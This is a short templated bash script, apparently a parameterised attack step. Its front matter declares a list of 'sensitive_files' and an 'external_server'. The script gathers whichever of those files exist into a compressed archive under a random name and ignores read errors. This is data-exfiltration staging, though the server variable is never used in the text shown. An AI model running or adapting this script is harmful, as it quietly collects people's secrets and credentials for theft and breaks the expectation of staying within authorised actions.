---
variables:
	- sensitive_files
	- external_server
---
available_files=()
{% for file in sensitive_files %}
if [[ -f "{{ file }}" ]]; then
	available_files+=("{{ file }}")
fi
{% endfor %}

name_length=$(expr ${RANDOM:1:1} + 1)
archive_name=$(tr -dc A-Za-z0-9 </dev/urandom | head -c $name_length).tar.gz
echo $archive_name
tar -czf $archive_name --ignore-failed-read --files-from <(printf "%s\n" "${available_files[@]}")